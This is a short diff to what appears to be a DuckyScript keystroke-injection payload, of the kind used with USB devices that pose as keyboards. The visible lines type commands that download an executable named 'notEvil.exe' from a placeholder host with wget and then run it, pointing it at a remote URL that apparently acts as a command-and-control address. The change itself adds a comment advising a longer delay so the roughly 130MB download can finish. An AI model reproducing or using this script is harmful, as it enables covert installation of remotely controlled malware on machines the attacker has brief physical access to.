@@ -13,6 +13,7 @@ STRING cd C:\temp
 ENTER
 STRING wget http://x.x.x.x:8443/notEvil.exe -OutFile notEvil.exe
 ENTER
+REM Change the Delay string to a larger value if on slower internet to allow for full download, this was tested over 5GHz WLAN for ~130MB file
 DELAY 60000
 STRING .\notEvil.exe -url https://x.x.x.x:443/
 ENTER
